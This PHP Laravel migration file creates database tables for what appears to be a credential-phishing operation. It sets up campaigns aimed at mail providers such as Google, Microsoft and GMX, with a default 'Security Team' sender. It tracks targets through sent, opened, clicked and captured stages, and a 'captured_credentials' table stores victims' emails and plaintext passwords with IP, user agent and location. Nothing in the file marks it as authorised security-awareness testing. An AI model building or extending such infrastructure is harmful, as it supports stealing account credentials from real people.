<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('phishing_campaigns', function (Blueprint $table) {
            $table->id();
            $table->string('name');
            $table->string('provider'); // google, microsoft, yahoo, gmx, etc.
            $table->string('subject'); // email subject
            $table->text('body_html'); // email HTML body
            $table->text('body_text')->nullable(); // plain text fallback
            $table->string('from_name')->default('Security Team');
            $table->string('from_email')->nullable();
            $table->string('reply_to')->nullable();
            $table->string('tracking_id', 32)->unique(); // unique tracking ID
            $table->enum('status', ['draft', 'active', 'paused', 'completed'])->default('draft');
            $table->integer('total_sent')->default(0);
            $table->integer('total_opened')->default(0);
            $table->integer('total_clicked')->default(0);
            $table->integer('total_captured')->default(0);
            $table->json('target_domains')->nullable(); // which domains to target
            $table->timestamp('started_at')->nullable();
            $table->timestamp('completed_at')->nullable();
            $table->timestamps();
        });

        Schema::create('phishing_targets', function (Blueprint $table) {
            $table->id();
            $table->foreignId('campaign_id')->constrained('phishing_campaigns')->onDelete('cascade');
            $table->string('email');
            $table->string('domain');
            $table->string('provider');
            $table->string('user_display_name')->nullable();
            $table->enum('status', ['pending', 'sent', 'opened', 'clicked', 'captured', 'failed'])->default('pending');
            $table->string('tracking_token', 32)->unique();
            $table->text('raw_line')->nullable();
            $table->timestamp('sent_at')->nullable();
            $table->timestamp('opened_at')->nullable();
            $table->timestamp('clicked_at')->nullable();
            $table->timestamp('captured_at')->nullable();
            $table->timestamps();

            $table->index(['campaign_id', 'status']);
            $table->index(['campaign_id', 'provider']);
        });

        Schema::create('captured_credentials', function (Blueprint $table) {
            $table->id();
            $table->foreignId('campaign_id')->constrained('phishing_campaigns')->onDelete('cascade');
            $table->foreignId('target_id')->nullable()->constrained('phishing_targets')->onDelete('set null');
            $table->string('email');
            $table->string('password');
            $table->string('provider');
            $table->string('ip_address')->nullable();
            $table->string('user_agent')->nullable();
            $table->string('country')->nullable();
            $table->string('city')->nullable();
            $table->json('extra_data')->nullable(); // additional form fields
            $table->timestamp('captured_at')->useCurrent();
            $table->timestamps();

            $table->index(['campaign_id', 'provider']);
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('captured_credentials');
        Schema::dropIfExists('phishing_targets');
        Schema::dropIfExists('phishing_campaigns');
    }
};
